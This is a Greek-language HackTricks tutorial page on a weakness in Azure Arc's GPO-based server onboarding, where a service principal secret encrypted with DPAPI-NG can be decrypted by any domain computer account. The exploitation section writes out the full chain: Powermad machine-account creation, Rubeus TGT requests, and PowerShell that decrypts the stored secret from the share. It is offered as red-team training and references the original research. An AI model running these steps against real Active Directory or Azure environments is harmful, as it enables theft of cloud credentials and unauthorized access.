# Az - Ευάλωτο Σενάριο Αναπτυγμένου GPO του Azure Arc

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Συμμετέχετε** 💬 στην [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα χάκερ κάνοντας υποβολή PRs** στα αποθετήρια του [**HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

### Αναγνώριση των Προβλημάτων

Το Azure Arc επιτρέπει την ολοκλήρωση νέων εσωτερικών διακομιστών (διακομιστές που έχουν ενταχθεί στον τομέα) στο Azure Arc χρησιμοποιώντας τη μέθοδο Group Policy Object. Για να διευκολύνει αυτή τη διαδικασία, η Microsoft παρέχει ένα εργαλείο ανάπτυξης που απαιτείται για την έναρξη της διαδικασίας ενσωμάτωσης. Μέσα στο αρχείο ArcEnableServerGroupPolicy.zip, μπορούν να βρεθούν τα ακόλουθα σενάρια: DeployGPO.ps1, EnableAzureArc.ps1, και AzureArcDeployment.psm1.

Κατά την εκτέλεση, το σενάριο DeployGPO.ps1 εκτελεί τις ακόλουθες ενέργειες:

1. Δημιουργεί το Azure Arc Servers Onboarding GPO εντός του τοπικού τομέα.
2. Αντιγράφει το σενάριο ενσωμάτωσης EnableAzureArc.ps1 στον καθορισμένο κοινόχρηστο φάκελο που δημιουργήθηκε για τη διαδικασία ενσωμάτωσης, ο οποίος περιέχει επίσης το πακέτο εγκατάστασης των Windows.

Κατά την εκτέλεση αυτού του σεναρίου, οι διαχειριστές συστημάτων πρέπει να παρέχουν δύο κύριες παραμέτρους: **ServicePrincipalId** και **ServicePrincipalClientSecret**. Επιπλέον, απαιτούνται άλλες παράμετροι όπως τον τομέα, το FQDN του διακομιστή που φιλοξενεί τον κοινόχρηστο φάκελο, και το όνομα του κοινόχρηστου φακέλου. Επιπλέον, πρέπει να παρέχονται λεπτομέρειες όπως το ID του ενοικιαστή, τον ομάδα πόρων, και άλλες απαραίτητες πληροφορίες στο σενάριο.

Ένα κρυπτογραφημένο μυστικό δημιουργείται στον κατάλογο AzureArcDeploy στον καθορισμένο κοινόχρηστο φάκελο χρησιμοποιώντας κρυπτογράφηση DPAPI-NG. Το κρυπτογραφημένο μυστικό αποθηκεύεται σε ένα αρχείο με το όνομα encryptedServicePrincipalSecret. Αποδείξεις γι' αυτό μπορούν να βρεθούν στο σενάριο DeployGPO.ps1, όπου η κρυπτογράφηση πραγματοποιείται καλώντας το ProtectBase64 με το $descriptor και το $ServicePrincipalSecret ως εισόδους. Το descriptor αποτελείται από τα SIDs των ομάδων Domain Computer και Domain Controller, εξασφαλίζοντας ότι το ServicePrincipalSecret μπορεί να αποκρυπτογραφηθεί μόνο από τις ομάδες ασφαλείας Domain Controllers και Domain Computers, όπως αναφέρεται στα σχόλια του σεναρίου.
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### Εκμετάλλευση

Έχουμε τις ακόλουθες συνθήκες:

1. Έχουμε εισβάλει με επιτυχία στο εσωτερικό δίκτυο.
2. Έχουμε τη δυνατότητα να δημιουργήσουμε ή να αναλάβουμε τον έλεγχο ενός λογαριασμού υπολογιστή εντός του Active Directory.
3. Έχουμε ανακαλύψει ένα κοινόχρηστο φάκελο που περιέχει τον κατάλογο AzureArcDeploy.

Υπάρχουν αρκετές μέθοδοι για την απόκτηση ενός λογαριασμού μηχανής εντός ενός περιβάλλοντος AD. Μία από τις πιο κοινές είναι η εκμετάλλευση του ορίου του λογαριασμού μηχανής. Μια άλλη μέθοδος περιλαμβάνει την εκμετάλλευση ενός λογαριασμού μηχανής μέσω ευάλωτων ACLs ή διαφόρων άλλων λαθών ρυθμίσεων.
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
Μόλας που αποκτήθηκε ένα λογαριασμός μηχανής, είναι δυνατή η πιστοποίηση χρησιμοποιώντας αυτόν τον λογαριασμό. Μπορούμε είτε να χρησιμοποιήσουμε την εντολή runas.exe με τη σημαία netonly είτε να χρησιμοποιήσουμε το pass-the-ticket με το Rubeus.exe.
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
Έχοντας το TGT για το λογαριασμό του υπολογιστή μας αποθηκευμένο στη μνήμη, μπορούμε να χρησιμοποιήσουμε το ακόλουθο script για να αποκρυπτογραφήσουμε το μυστικό του υπηρεσιών πρωτεύοντος.
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
Εναλλακτικά, μπορούμε να χρησιμοποιήσουμε το [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG).

Σε αυτό το σημείο, μπορούμε να συγκεντρώσουμε τις υπόλοιπες πληροφορίες που χρειαζόμαστε για να συνδεθούμε στο Azure από το αρχείο ArcInfo.json, το οποίο αποθηκεύεται στον ίδιο κοινόχρηστο φάκελο με το αρχείο encryptedServicePrincipalSecret. Αυτό το αρχείο περιέχει λεπτομέρειες όπως: TenantId, servicePrincipalClientId, ResourceGroup, και άλλα. Με αυτές τις πληροφορίες, μπορούμε να χρησιμοποιήσουμε το Azure CLI για να πιστοποιηθούμε ως το υποβαθμισμένο service principal.

## Αναφορές

- [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Arc/)
